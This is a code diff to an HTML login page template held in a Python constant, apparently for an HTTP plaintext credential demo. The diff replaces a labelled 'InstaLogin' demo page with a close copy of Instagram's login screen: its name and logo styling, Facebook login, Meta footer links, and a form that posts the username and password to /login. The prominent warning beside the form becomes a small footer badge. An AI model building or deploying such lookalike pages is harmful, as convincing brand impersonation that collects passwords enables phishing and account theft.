@@ -26,115 +26,137 @@ LOGIN_PAGE_HTML = """<!DOCTYPE html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>InstaLogin - Security Baseline Demo</title>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <title>Instagram - Login Demo</title>
+    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&family=Outfit:wght@300;400;500;600&display=swap" rel="stylesheet">
     <style>
         * {{
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: 'Outfit', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }}
         body {{
-            background-color: #fafafa;
+            background-color: #f0f9ff;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             padding: 20px;
         }}
-        .container {{
+        .main-card {{
+            background: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
             width: 100%;
-            max-width: 350px;
+            max-width: 935px;
+            min-height: 580px;
             display: flex;
             flex-direction: column;
-            gap: 10px;
+            justify-content: space-between;
+            align-items: center;
+            padding: 40px 20px 28px 20px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.02);
+        }}
+        .login-container {{
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            flex-grow: 1;
+            width: 100%;
         }}
         .login-box {{
-            background-color: #fff;
+            background-color: #ffffff;
             border: 1px solid #dbdbdb;
-            border-radius: 8px;
-            padding: 40px 30px 25px 30px;
-            text-align: center;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
-        }}
-        .logo {{
-            font-size: 36px;
-            font-weight: 700;
-            margin-bottom: 8px;
-            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            font-style: italic;
-            letter-spacing: -1px;
-        }}
-        .demo-badge {{
-            display: inline-block;
-            padding: 5px 12px;
-            font-size: 10px;
-            font-weight: 700;
-            border-radius: 20px;
-            margin-bottom: 24px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            background-color: #ffebee;
-            color: #c62828;
-            border: 1px solid #ffcdd2;
-        }}
-        .form-group {{
-            position: relative;
-            margin-bottom: 8px;
-        }}
-        .form-group input {{
+            border-radius: 1px;
             width: 100%;
-            padding: 12px 10px;
+            max-width: 350px;
+            padding: 30px 40px 25px 40px;
+            display: flex;
+            flex-direction: column;
+            text-align: center;
+        }}
+        .logo-container {{
+            margin: 10px auto 20px auto;
+        }}
+        .logo-text {{
+            font-family: 'Grand Hotel', cursive;
+            font-size: 52px;
+            color: #262626;
+            user-select: none;
+        }}
+        .form-container {{
+            display: flex;
+            flex-direction: column;
+        }}
+        .input-group {{
+            position: relative;
+            margin-bottom: 6px;
+            display: flex;
+            align-items: center;
+        }}
+        .input-group input {{
+            width: 100%;
+            padding: 11px 8px 9px 8px;
             background: #fafafa;
             border: 1px solid #dbdbdb;
-            border-radius: 4px;
+            border-radius: 3px;
             font-size: 12px;
             color: #262626;
             outline: none;
-            transition: border-color 0.2s ease;
         }}
-        .form-group input:focus {{
+        .input-group input:focus {{
             border-color: #a8a8a8;
-            background: #fff;
         }}
-        .login-btn {{
-            width: 100%;
-            background-color: #0095f6;
-            color: #fff;
-            border: none;
-            border-radius: 4px;
-            padding: 10px;
+        .input-group .toggle-pass {{
+            position: absolute;
+            right: 8px;
             font-size: 14px;
             font-weight: 600;
+            color: #262626;
+            cursor: pointer;
+            user-select: none;
+            background: none;
+            border: none;
+            outline: none;
+        }}
+        .login-btn {{
+            background-color: #0095f6;
+            border: 1px solid transparent;
+            border-radius: 8px;
+            color: #ffffff;
+            font-weight: 600;
+            font-size: 14px;
+            padding: 7px 16px;
             cursor: pointer;
             margin-top: 8px;
-            transition: background-color 0.2s ease;
+            text-align: center;
+            user-select: none;
+            transition: background-color 0.1s ease;
         }}
         .login-btn:hover {{
             background-color: #1877f2;
         }}
-        .divider {{
+        .divider-container {{
             display: flex;
             align-items: center;
-            margin: 20px 0;
-            color: #8e8e8e;
-            font-size: 12px;
-            font-weight: 600;
+            margin: 20px 0 20px 0;
         }}
-        .divider::before, .divider::after {{
-            content: "";
-            flex: 1;
+        .divider-line {{
+            flex-grow: 1;
             height: 1px;
             background-color: #dbdbdb;
         }}
-        .divider span {{
-            padding: 0 10px;
+        .divider-text {{
+            color: #8e8e8e;
+            font-size: 12px;
+            font-weight: 600;
+            margin: 0 18px;
+            text-transform: uppercase;
         }}
-        .fb-login {{
+        .fb-login-btn {{
+            background: none;
+            border: none;
             color: #385185;
             font-size: 14px;
             font-weight: 600;
@@ -143,68 +165,145 @@ LOGIN_PAGE_HTML = """<!DOCTYPE html>
             justify-content: center;
             gap: 8px;
             cursor: pointer;
+            margin: 8px 0;
             text-decoration: none;
-            margin-bottom: 15px;
-            margin-top: 10px;
         }}
         .fb-icon {{
+            background-color: #385185;
+            color: white;
+            border-radius: 4px;
+            width: 16px;
+            height: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
             font-weight: bold;
-            font-size: 16px;
         }}
-        .info-box {{
-            background-color: #fff;
-            border: 1px solid #dbdbdb;
-            border-radius: 8px;
-            padding: 20px;
+        .forgot-pass {{
+            color: #00376b;
+            font-size: 12px;
             text-align: center;
-            font-size: 14px;
-            color: #262626;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
-        }}
-        .info-box a {{
-            color: #0095f6;
             text-decoration: none;
-            font-weight: 600;
+            margin-top: 12px;
         }}
-        .message-container {{
+        .footer-container {{
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 30px;
+        }}
+        .footer-links {{
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 16px;
+            width: 100%;
+        }}
+        .footer-links a {{
+            color: #8e8e8e;
+            font-size: 12px;
+            text-decoration: none;
+        }}
+        .footer-links a:hover {{
+            text-decoration: underline;
+        }}
+        .server-indicator {{
+            margin-top: 24px;
+            text-align: center;
+        }}
+        .indicator-badge {{
+            display: inline-block;
+            padding: 6px 14px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            background-color: #ffebee;
+            color: #c62828;
+            border: 1px solid #ffcdd2;
+        }}
+        .message-box {{
             margin-top: 15px;
             font-size: 13px;
         }}
     </style>
 </head>
 <body>
-  <div class="container">
-    <div class="login-box">
-      <div class="logo">InstaLogin</div>
-      <span class="demo-badge">⚠ HTTP PLAINTEXT DEMO</span>
-      
-      <form method="POST" action="/login">
-        <div class="form-group">
-          <input type="text" name="username" placeholder="Phone number, username, or email" required>
+  <div class="main-card">
+    <div class="login-container">
+      <div class="login-box">
+        <div class="logo-container">
+          <div class="logo-text">Instagram</div>
         </div>
-        <div class="form-group">
-          <input type="password" name="password" placeholder="Password" required>
+        
+        <form class="form-container" method="POST" action="/login">
+          <div class="input-group">
+            <input type="text" name="username" placeholder="Phone number, username, or email" required>
+          </div>
+          <div class="input-group">
+            <input type="password" name="password" id="password-field" placeholder="Password" required>
+            <button type="button" class="toggle-pass" onclick="togglePassword()">Show</button>
+          </div>
+          <button type="submit" class="login-btn">Log in</button>
+        </form>
+        
+        <div class="divider-container">
+          <div class="divider-line"></div>
+          <div class="divider-text">or</div>
+          <div class="divider-line"></div>
         </div>
-        <button type="submit" class="login-btn">Log In</button>
-      </form>
-      
-      <div class="divider">
-        <span>OR</span>
-      </div>
-      
-      <a href="#" class="fb-login">
-        <span class="fb-icon">f</span> Log in with Facebook
-      </a>
-      
-      <div class="message-container">
-        {message}
+        
+        <a href="#" class="fb-login-btn">
+          <span class="fb-icon">f</span> Log in with Facebook
+        </a>
+        
+        <a href="#" class="forgot-pass">Forgot password?</a>
+        
+        <div class="message-box">
+          {message}
+        </div>
       </div>
     </div>
     
-    <div class="info-box">
-      Don't have an account? <a href="#">Sign up</a>
+    <div class="footer-container">
+      <div class="footer-links">
+        <a href="#">Meta</a>
+        <a href="#">About</a>
+        <a href="#">Blog</a>
+        <a href="#">Jobs</a>
+        <a href="#">Help</a>
+        <a href="#">API</a>
+        <a href="#">Privacy</a>
+        <a href="#">Cookie Settings</a>
+        <a href="#">Terms</a>
+        <a href="#">Locations</a>
+        <a href="#">Instagram Lite</a>
+        <a href="#">Threads</a>
+        <a href="#">Contact Uploading & Non-Users</a>
+        <a href="#">Meta Verified</a>
+      </div>
+      <div class="server-indicator">
+        <span class="indicator-badge">HTTP (PLAINTEXT BASELINE DEMO)</span>
+      </div>
     </div>
   </div>
+
+  <script>
+    function togglePassword() {{
+      var x = document.getElementById("password-field");
+      var btn = document.querySelector(".toggle-pass");
+      if (x.type === "password") {{
+        x.type = "text";
+        btn.textContent = "Hide";
+      }} else {{
+        x.type = "password";
+        btn.textContent = "Show";
+      }}
+    }}
+  </script>
 </body>
 </html>"""
 
